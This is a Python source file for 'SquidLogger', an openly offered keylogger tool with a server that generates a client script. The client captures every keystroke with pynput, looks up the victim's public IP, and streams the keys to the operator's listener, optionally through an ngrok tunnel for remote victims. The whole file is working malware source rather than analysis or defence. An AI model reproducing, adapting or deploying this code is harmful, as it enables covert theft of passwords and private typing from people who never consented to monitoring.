import socket, threading, os, sys
from optparse import OptionParser
class KeylogServer:
    def __init__(self, ip, port, ngrokHost=None, ngrokPort=None):
        self.ip = ip
        self.port = port
        self.logo()
        self.clientname = "SquidLoggerClient.py"
        self.file = open(self.clientname,"w")
        self.file.write(self.clientscript())
        self.file.close()
        self.conn_list = []
        if ngrokHost is not None:
            self.ngrokhost = ngrokHost
            self.ngrokport = int(ngrokPort)
        else:
            self.ngrokhost = self.ip
            self.ngrokport = self.port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.ip,self.port))
        print(f"[+] Client-Script has been generated in: {os.getcwd()}/{self.clientname}")
        print(f"[+] Server binded to: {self.ip}:{self.port}")
    def clientscript(self):
        script = """
from pynput.keyboard import Listener
import socket, urllib.request, threading
class Keylogger:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.selfip = self.getip()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.ip,self.port))
        self.client.send(self.selfip.encode())
        self.logger = threading.Thread(target=self.start_logging)
        self.logger.start()
    def getip(self):
        try:
            url = 'https://httpbin.org/ip'
            req = urllib.request.Request(url)
            result = urllib.request.urlopen(req)
            try:
                result = result.read().decode()
            except:
                result = result.read()
            contents = result.split()
            ip = contents[2].strip('"')
            return str(ip)
        except:
            pass
    def on_press(self,key):
        self.client.send(str(key).encode())
    def on_release(self,key):
        pass
    def start_logging(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
keylog = Keylogger('"""+self.ngrokhost+"""',"""+self.ngrokport+""")
        """
        return script
    def logo(self):
        print("""
  _____             _     _ _                                        __   ___  
 / ____|           (_)   | | |                                      /_ | / _ \ 
| (___   __ _ _   _ _  __| | |     ___   __ _  __ _  ___ _ __  __   _| || | | |
 \___ \ / _` | | | | |/ _` | |    / _ \ / _` |/ _` |/ _ \ '__| \ \ / / || | | |
 ____) | (_| | |_| | | (_| | |___| (_) | (_| | (_| |  __/ |     \ V /| || |_| |
|_____/ \__, |\__,_|_|\__,_|______\___/ \__, |\__, |\___|_|      \_/ |_(_)___/ 
           | |                           __/ | __/ |                           
           |_|                          |___/ |___/          
Key-Logger-Server by DrSquid                  """)
    def listen(self):
        while True:
            self.server.listen()
            conn, ip = self.server.accept()
            handle = threading.Thread(target=self.handler,args=(conn,))
            handle.start()
    def handler(self, conn):
        registered = False
        ip = None
        while True:
            msg = conn.recv(1024).decode()
            if not registered:
                print(f"[+] Connection From: {msg}")
                registered = True
                ip = msg
            else:
                print(f"[({ip})]: {msg}")
class OptionParse:
    def __init__(self):
        if len(sys.argv) < 2:
            self.usage()
        else:
            self.get_args()
    def usage(self):
        KeylogServer.logo(None)
        print("""
[+] Option-Parsing Help:
[+] --ip, --ipaddr    - Specifies an IP Address to bind to.
[+] --p,  --port      - Specifies the port to bind the IP to.

[+] Optional Arguements:
[+] --nH, --ngrokhost - Specifies the ngrok host
[+] --nP, --ngrokport - Specifies the ngrok port
[+] --i,  --info   - Shows this message.

[+] Usage:""")
        if sys.argv[0].endswith(".py"):
            print("[+] python3 SquidLogger.py --ip <ipaddr> --p <port>")
            print("[+] python3 SquidLogger.py --i")
        else:
            print("[+] SquidLogger --ip <ipaddr> --p <port>")
            print("[+] SquidLogger --i")
    def get_args(self):
        self.opts = OptionParser()
        self.opts.add_option("--ip","--ipaddr",dest="ip")
        self.opts.add_option("--p","--port",dest="port")
        self.opts.add_option("--nH","--ngrokhost",dest="ngrokhost")
        self.opts.add_option("--nP","--ngrokport",dest="ngrokport")
        self.opts.add_option("--i","--info",dest="info",action="store_true")
        args, opt =self.opts.parse_args()
        if args.info is not None:
            self.usage()
        else:
            pass
        if args.ip is None:
            ip = "localhost"
        else:
            ip = args.ip
        if args.port is None:
            port = 80
        else:
            try:
                port = int(args.port)
            except:
                print("[+] Invalid Port!")
                sys.exit()
        if args.ngrokhost is not None:
            ngrokhost = args.ngrokhost
        else:
            ngrokhost = None
        if args.ngrokport is not None:
            try:
                ngrokport = int(args.ngrokport)
            except:
                print("[+] Invalid Port!")
                sys.exit()
        else:
            ngrokport = None
        SquidLogger = KeylogServer(ip, port, ngrokhost, ngrokport)
        SquidLogger.listen()
optionparse = OptionParse()